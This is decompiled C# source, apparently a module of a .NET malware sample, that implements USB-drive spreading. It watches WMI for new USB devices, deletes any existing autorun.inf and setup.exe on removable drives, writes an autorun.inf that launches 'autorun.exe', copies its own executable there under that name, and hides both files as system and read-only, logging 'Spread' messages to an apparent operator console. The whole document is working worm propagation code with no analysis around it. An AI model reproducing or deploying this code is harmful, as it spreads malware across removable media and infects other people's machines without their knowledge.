using System;
using System.IO;
using System.Management;
using System.Threading;
using System.Windows.Forms;

internal sealed class Class9
{
	private static ManagementEventWatcher managementEventWatcher_0;

	public static void smethod_0()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		ManagementScope val = new ManagementScope("root\\CIMV2");
		val.get_Options().set_EnablePrivileges(true);
		try
		{
			WqlEventQuery val2 = new WqlEventQuery();
			val2.set_EventClassName("__InstanceCreationEvent");
			val2.set_WithinInterval(new TimeSpan(0, 0, 3));
			val2.set_Condition("TargetInstance ISA 'Win32_USBControllerdevice'");
			managementEventWatcher_0 = new ManagementEventWatcher(val, (EventQuery)(object)val2);
			managementEventWatcher_0.add_EventArrived(new EventArrivedEventHandler(smethod_1));
			managementEventWatcher_0.Start();
		}
		catch
		{
			if (managementEventWatcher_0 != null)
			{
				managementEventWatcher_0.Stop();
			}
		}
	}

	public static void smethod_1(object sender, EventArgs e)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
			{
				int num = 0;
				try
				{
					if (File.Exists(driveInfo.Name + "autorun.inf"))
					{
						File.Delete(driveInfo.Name + "autorun.inf");
					}
					if (File.Exists(driveInfo.Name + "setup.exe"))
					{
						File.Delete(driveInfo.Name + "setup.exe");
					}
				}
				catch
				{
				}
				string text = Path.Combine(Environment.CurrentDirectory, "autorun.inf");
				StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("label=USB Drive");
				streamWriter.WriteLine("icon=%SystemRoot%\\system32\\SHELL32.dll,8");
				streamWriter.WriteLine("open=autorun.exe");
				streamWriter.WriteLine("shellexecute=autorun.exe");
				streamWriter.WriteLine("action=USB Drive explorer");
				streamWriter.Close();
				File.Copy(text, driveInfo.Name + "autorun.inf");
				num++;
				File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
				try
				{
					File.Copy(Application.get_ExecutablePath(), driveInfo.Name + "autorun.exe");
					num++;
					File.SetAttributes(driveInfo.Name + "autorun.exe", File.GetAttributes(driveInfo.Name + "autorun.exe") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
				}
				finally
				{
					Class29.class26_0.method_3("Spread: USB Drive " + driveInfo.Name + " detected! - " + num + " Files copied!", Class30.string_1, "light_blue");
					Thread.Sleep(2000);
				}
			}
			if (managementEventWatcher_0 != null)
			{
				managementEventWatcher_0.Stop();
			}
			managementEventWatcher_0.Start();
		}
	}
}
